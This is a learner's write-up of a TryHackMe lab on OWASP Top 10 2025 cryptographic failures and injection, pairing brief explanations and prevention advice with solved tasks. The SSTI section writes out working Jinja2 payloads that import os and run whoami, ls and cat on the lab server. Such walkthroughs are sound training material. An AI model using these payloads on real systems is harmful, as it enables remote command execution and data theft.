# OWASP Top 10 2025: Insecure Data Handling

Room: [OWASP Top 10 2025: Insecure Data Handling](https://tryhackme.com/room/owasptopten2025three)

<img width="933" height="197" alt="image" src="https://github.com/user-attachments/assets/25678e6d-88c6-4ba2-80ca-56c3128bd368" />

## Introduction

This room will introduce you to 3 elements of the OWASP Top 10 list (2025). In this room, you will learn about the elements relating to application behaviour and user input. We will cover these vulnerabilities briefly, how to prevent them, and finally, you will practice exploiting these vulnerabilities:
- A04: Cryptographic Failures
- A05: Injection
- A08: Software or Data Integrity Failures

---

### Deploy Practical

Start the Lab Machine and I am using my Kali Linux Machine as an Attack Box, so I will connect my machine to the TryHackMe Server by OpenVPN.

You can check how to connect your machine by OpenVPN through this room: [OpenVPN](https://tryhackme.com/room/openvpn)

Connecting by command: `sudo openvpn <filename>`

## A04: Cryptographic Failures

**What are Cryptographic Failures?**

Cryptographic failures happen when sensitive data isn't adequately protected due to lack of encryption, faulty implementation, or insufficient security measures. This includes storing passwords without hashing, using outdated or weak algorithms (such as MD5, SHA1, or DES), exposing encryption keys, or failing to secure data during transmission.

A good example is when a company creates its own encryption method instead of using trusted and well-tested encryption algorithms. Their custom encryption is often less secure and can contain weaknesses that attackers can exploit.

**How to Prevent Cryptographic Failures**

Preventing cryptographic failures starts with choosing strong, modern algorithms and implementing them properly. Sensitive information such as passwords should be hashed using robust, slow hashing functions like bcrypt, scrypt, or Argon2. When encrypting data, avoid creating your own algorithms; instead, rely on trusted, industry-standard libraries.

Never embed access credentials (i.e., to a third-party service) in source code, configuration files, or repositories. Instead, use secure key management systems or environments specifically designed for storing secrets.

---

### Practical

The practical for this task is located at `http://MACHINE_IP:8001`. This web app demonstrates a "note sharing" service that uses a weak, shared derivative key to protect the notes.

Follow the steps on the web application to unlock all notes and retrieve a flag.

---

### Recommended TryHackMe Content

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content: [Cryptographic Failures Module](https://tryhackme.com/module/cryptofailures)

---

### Answer the questions below

Decrypt the encrypted notes. One of them will contain a flag value. What is it?

Navigating to the page gives us hint that it uses Weak XOR Cipher where the first three characters of the ket is `KEY`, we just need to guess the 4th character of the key.

I created a small python script `decode.py` which bruteforces letters and numbers and we get readable english in `KEY1`:

<img width="362" height="335" alt="image" src="https://github.com/user-attachments/assets/e288fbeb-d60a-482b-91e0-3ffff61587fc" />

<img width="808" height="625" alt="image" src="https://github.com/user-attachments/assets/2f4590fc-b3b8-4971-9b7c-31a294c9295d" />

## A05: Injection

**What is Injection?**

Injection occurs when an application takes user input and mishandles it. Instead of processing the input securely, the application passes it directly into a system that can execute commands or queries, such as a database, a shell, a templating engine or API.

You are likely familiar with SQL Injection, where an attacker inserts an SQL query into an application's logic, such as a login form, which then gets processed by the database. This happens when the web application fails to sanitise user input and instead uses it to construct the query. For instance, taking the "username" input on a login form and directly using it to query the database.

The following are some classic examples of injection that you may be familiar with:
- SQL Injection
- Command Injection
- AI Prompts
- Server Side Template Injection (SSTI)

Command Injection is a vulnerability that allows an attacker to execute operating system (OS) commands on a server by supplying malicious input to an application.

SSTI happens when a web application treats user input as template code instead of plain text, allowing an attacker to execute template expressions or even server-side code.

**How to Prevent Injection**

Preventing injection starts by ensuring that user input is always treated as untrusted. Rather than parsing directly, instead, take elements of the input for querying. When writing SQL queries, developers should use prepared statements or parameterized queries instead of joining user input directly into the SQL query. For OS commands, avoid functions that pass input directly to the system shell, and instead rely on safe APIs and processes that don’t invoke the shell at all.

Input validation and sanitisation play a crucial role in preventing these types of attack. Escape dangerous characters, enforce strict data types and filter before the application even processes the input.

---

### Practical

Today's practical will showcase command injection. This example illustrates Server Side Template Injection (SSTI). You will abuse an application's ability to render dynamic content to retrieve a flag stored on the machine hosting the application.

You can access this portion of the practical on `http://MACHINE_IP:8000`.

---

### Recommended TryHackMe Content

If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content: [Injection Attacks Module](https://tryhackme.com/module/injection-attacks)

---

### Answer the questions below

Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.

Navigating to the page gives us SSTI Page.

We first confirm the SSTI Vulnerability by writing `{{7*7}}` which gives us 49 that confirms the vulnerability that it does not checks the inputs very good.

Then we see the user of the system by `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}` which gives us `root` which is a good sign.

Then doing the `ls` command to check the files, we get `flag.txt`: 

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`

<img width="412" height="329" alt="image" src="https://github.com/user-attachments/assets/d7837905-8dac-4699-bf6c-180962d1b882" />

Check the contents of `flag.txt`: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`

<img width="1660" height="649" alt="image" src="https://github.com/user-attachments/assets/fac72550-f2ff-4cb3-9664-ff945b416870" />







